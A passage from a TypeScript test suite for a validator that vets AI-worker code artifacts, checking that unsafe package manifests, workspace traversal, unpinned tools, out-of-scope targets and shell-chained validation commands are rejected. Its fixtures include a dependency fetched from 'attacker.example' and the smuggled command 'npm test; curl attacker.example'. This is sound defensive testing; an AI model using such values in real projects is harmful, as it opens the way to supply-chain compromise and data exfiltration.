        devDependencies: { typescript: "5.9.2" },
      },
      {
        scripts: { check: "tsc --noEmit" },
        dependencies: { typescript: "https://attacker.example/typescript.tgz" },
      },
    ]) {
      const fixture = await repositoryFixture();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await writeFile(
        join(worker.path, "package.json"),
        JSON.stringify({
          name: "greenfield",
          packageManager: "pnpm@10.34.5",
          ...manifest,
        }),
      );
      await writeFile(
        join(worker.path, "pnpm-lock.yaml"),
        pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
      );
      execFileSync("git", ["add", "package.json", "pnpm-lock.yaml"], { cwd: worker.path });
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            allowedPaths: ["package.json", "pnpm-lock.yaml"],
            validationCommands: ["pnpm check"],
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["node", "pnpm"],
              networkDestinations: ["registry.npmjs.org"],
            },
          }),
        }),
      ).rejects.toThrow(/bootstrap validation|bootstrap package/);
    }
  });

  it("rejects workspace traversal, unpinned Turbo, and broadened task closure before execution", async () => {
    for (const unsafe of [
      {
        workspace: "packages:\n  - ../outside/*\n",
        turbo: '{"tasks":{"check":{}}}\n',
        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
        reason: /workspace/,
      },
      {
        workspace: "packages:\n  - packages/*\n",
        turbo: '{"tasks":{"check":{"dependsOn":["build"]}}}\n',
        devDependencies: { turbo: "2.5.6", typescript: "5.9.2" },
        reason: /turbo task/,
      },
      {
        workspace: "packages:\n  - packages/*\n",
        turbo: '{"tasks":{"check":{}}}\n',
        devDependencies: { typescript: "5.9.2" },
        reason: /turbo runner is not pinned/,
      },
    ]) {
      const fixture = await repositoryFixture();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await mkdir(join(worker.path, "packages", "example"), { recursive: true });
      await writeFile(
        join(worker.path, "package.json"),
        JSON.stringify({
          name: "greenfield",
          packageManager: "pnpm@10.34.5",
          scripts: { check: "turbo run check" },
          devDependencies: unsafe.devDependencies,
        }),
      );
      await writeFile(
        join(worker.path, "pnpm-lock.yaml"),
        pnpmBootstrapLock([".", "packages/example"], ["turbo@2.5.6", "typescript@5.9.2"]),
      );
      await writeFile(join(worker.path, "pnpm-workspace.yaml"), unsafe.workspace);
      await writeFile(join(worker.path, "turbo.json"), unsafe.turbo);
      await writeFile(
        join(worker.path, "packages", "example", "package.json"),
        JSON.stringify({ name: "example", scripts: { check: "tsc --noEmit" } }),
      );
      execFileSync("git", ["add", "."], { cwd: worker.path });
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            allowedPaths: [
              "package.json",
              "pnpm-lock.yaml",
              "pnpm-workspace.yaml",
              "turbo.json",
              "packages/",
            ],
            validationCommands: ["pnpm check"],
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["node", "pnpm"],
              networkDestinations: ["registry.npmjs.org"],
            },
          }),
        }),
      ).rejects.toThrow(unsafe.reason);
    }
  });

  it("rejects missing bootstrap evidence and validation targets outside Work Item scope", async () => {
    for (const variant of [
      { packageManager: "yarn@4.9.2", script: "tsc --noEmit", lockfile: true },
      { packageManager: "pnpm@10.34.5", script: "tsc --noEmit", lockfile: false },
      { packageManager: "pnpm@10.34.5", script: "node --test outside.test.js", lockfile: true },
    ]) {
      const fixture = await repositoryFixture();
      await writeFile(join(fixture.repository, "outside.test.js"), "export {};\n");
      execFileSync("git", ["add", "outside.test.js"], { cwd: fixture.repository });
      execFileSync("git", ["commit", "-qm", "outside base test"], { cwd: fixture.repository });
      fixture.baseSha = execFileSync("git", ["rev-parse", "HEAD"], {
        cwd: fixture.repository,
        encoding: "utf8",
      }).trim();
      const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
      await writeFile(
        join(worker.path, "package.json"),
        JSON.stringify({
          name: "greenfield",
          packageManager: variant.packageManager,
          scripts: { check: variant.script },
          devDependencies: { typescript: "5.9.2" },
        }),
      );
      if (variant.lockfile)
        await writeFile(
          join(worker.path, "pnpm-lock.yaml"),
          pnpmBootstrapLock(["."], ["typescript@5.9.2"]),
        );
      execFileSync("git", ["add", "."], { cwd: worker.path });
      const artifact = await collectLocalArtifact(worker);
      await cleanupLocalWorktree(worker);
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            allowedPaths: ["package.json", "pnpm-lock.yaml"],
            validationCommands: ["pnpm check"],
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["node", "pnpm"],
              networkDestinations: ["registry.npmjs.org"],
            },
          }),
        }),
      ).rejects.toThrow(/bootstrap pnpm validation|outside Work Item scope/);
    }
  });

  it("rejects model-authored shell control and interpreter evaluation", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    for (const validationCommands of [
      ["npm test; curl attacker.example"],
      ["node -e process.exit(0)"],
      ["sh -c true"],
      ["git status"],
    ]) {
      await expect(
        validateArtifactClean({
          repository: fixture.repository,
          artifact,
          packet: packet(fixture.baseSha, {
            validationCommands,
            requirements: {
              ...packet(fixture.baseSha).requirements,
              tools: ["npm", "node", "sh", "git"],
            },
          }),
        }),
      ).rejects.toThrow(/validation command/i);
    }
  });

  it("fails closed on sensitive surfaces and isolated trust without a sandbox validator", async () => {
    const fixture = await repositoryFixture();
    const sensitive = normalizeArtifact({
      baseSha: fixture.baseSha,
      patch: "diff --git a/package-lock.json b/package-lock.json\n",
      changedPaths: ["package-lock.json"],
      outcome: "succeeded",
    });
    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact: sensitive,
        packet: packet(fixture.baseSha, { allowedPaths: ["package-lock.json"] }),
      }),
    ).rejects.toThrow(/sensitive surface/);

    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: packet(fixture.baseSha, {
          requirements: {
            os: [],
            architecture: [],
            tools: ["grep"],
            services: [],
            networkDestinations: [],
            permittedSecretNames: [],
            trust: "isolated",
          },
        }),
      }),
    ).rejects.toThrow(/isolated validation backend/);
  });

  it("accepts isolated evidence only when it binds the fresh host-applied tree and plan", async () => {
    const fixture = await repositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const trusted = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: packet(fixture.baseSha),
    });
    const outputTreeSha = trusted.evidence.outputTreeSha;
    await discardValidationResult(trusted);

    const isolatedPacket = packet(fixture.baseSha, {
      requirements: {
        os: ["linux"],
        architecture: [],
        tools: ["grep"],
        services: [],
        networkDestinations: [],
        permittedSecretNames: [],
        trust: "isolated",
      },
    });
    const result = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: isolatedPacket,
      isolatedValidator: async () => ({
        outputTreeSha,
        commands: [
          {
            command: isolatedPacket.validationCommands[0]!,
            exitCode: 0,
            durationMs: 12,
          },
        ],
        passed: true,
        startedAt: "2026-09-03T00:00:00.000Z",
        completedAt: "2026-09-03T00:00:00.012Z",
        environmentIdentity: `registry.example.invalid/validator@sha256:${"a".repeat(64)}`,
      }),
    });
    expect(result.evidence.passed).toBe(true);
    expect(result.evidence.outputTreeSha).toBe(outputTreeSha);
    expect(result.evidence.environmentIdentity).toBe(
      `registry.example.invalid/validator@sha256:${"a".repeat(64)}`,
    );
    await discardValidationResult(result);

    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: isolatedPacket,
        isolatedValidator: async () => ({
          outputTreeSha: "b".repeat(40),
          commands: [],
          passed: true,
          startedAt: "2026-09-03T00:00:00.000Z",
          completedAt: "2026-09-03T00:00:00.012Z",
        }),
      }),
    ).rejects.toThrow(/does not match host tree/);
  });

  it("accepts isolated npm setup evidence before the declared validation plan", async () => {
    const fixture = await nodeRepositoryFixture();
    const worker = await createLocalWorktree(fixture.repository, fixture.baseSha);
    await writeFile(join(worker.path, "value.txt"), "changed\n");
    const artifact = await collectLocalArtifact(worker);
    await cleanupLocalWorktree(worker);
    const localPacket = packet(fixture.baseSha, {
      validationCommands: ["npm test"],
      requirements: {
        ...packet(fixture.baseSha).requirements,
        tools: ["npm", "node"],
      },
    });
    const trusted = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: localPacket,
    });
    const outputTreeSha = trusted.evidence.outputTreeSha;
    await discardValidationResult(trusted);

    const isolatedPacket = packet(fixture.baseSha, {
      validationCommands: ["npm test"],
      requirements: {
        ...localPacket.requirements,
        trust: "isolated",
      },
    });
    const timestamps = {
      startedAt: "2026-09-04T00:00:00.000Z",
      completedAt: "2026-09-04T00:00:00.012Z",
    };
    const result = await validateArtifactClean({
      repository: fixture.repository,
      artifact,
      packet: isolatedPacket,
      isolatedValidator: async () => ({
        outputTreeSha,
        commands: [
          { command: "npm ci --no-audit --no-fund", exitCode: 0, durationMs: 8 },
          { command: "npm test", exitCode: 0, durationMs: 4 },
        ],
        passed: true,
        ...timestamps,
      }),
    });
    expect(result.evidence.passed).toBe(true);
    expect(result.evidence.commands.map(({ command }) => command)).toEqual([
      "npm ci --no-audit --no-fund",
      "npm test",
    ]);
    await discardValidationResult(result);

    await expect(
      validateArtifactClean({
        repository: fixture.repository,
        artifact,
        packet: isolatedPacket,
        isolatedValidator: async () => ({
          outputTreeSha,
          commands: [{ command: "npm test", exitCode: 0, durationMs: 4 }],
          passed: true,
          ...timestamps,
        }),
      }),
    ).rejects.toThrow(/command evidence does not match/);
  });
});
